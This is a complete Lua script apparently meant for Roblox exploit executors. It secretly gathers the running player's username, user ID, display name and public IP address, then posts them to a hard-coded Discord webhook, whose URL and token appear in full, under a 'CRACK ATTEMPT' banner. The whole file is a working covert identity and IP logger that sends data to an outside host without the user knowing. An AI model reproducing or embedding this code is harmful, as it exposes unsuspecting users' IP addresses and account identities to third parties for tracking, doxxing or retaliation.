local url = "https://discord.com/api/webhooks/1033567649575223387/aUoc1F-XCG4YrdwpEvaES_1rvQ_JuxjOYQ45pKAaVxphkFIaYb7sin7Xn11yjISkOS6X"
local plr = game:GetService("Players").LocalPlayer
local name = plr.Name
local Ip = game:HttpGet('https://v4.ident.me/')


local data = {
    ["content"] = "",
    ["embeds"] = {
        {
            ["title"] = "**CRACK ATTEMPT, BRING DOWN THE SCRIPT**",
            ["description"] = 'Username: **'..name..'**\nUser ID: **'..plr.UserId..'**\nDisplay name: **'..plr.DisplayName..'**\nFrom: **'..Ip..'**' ,
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. name
            }
        }
    }
}
local req = (syn and syn.request) or (request or http_request or httprequest) or (fluxus and fluxus.request)

if (req) then 
    req{
        Url = url;
        Headers = {["Content-Type"] = "application/json"};
        Body = game:GetService("HttpService"):JSONEncode(data);
        Method = 'POST';
    }
end
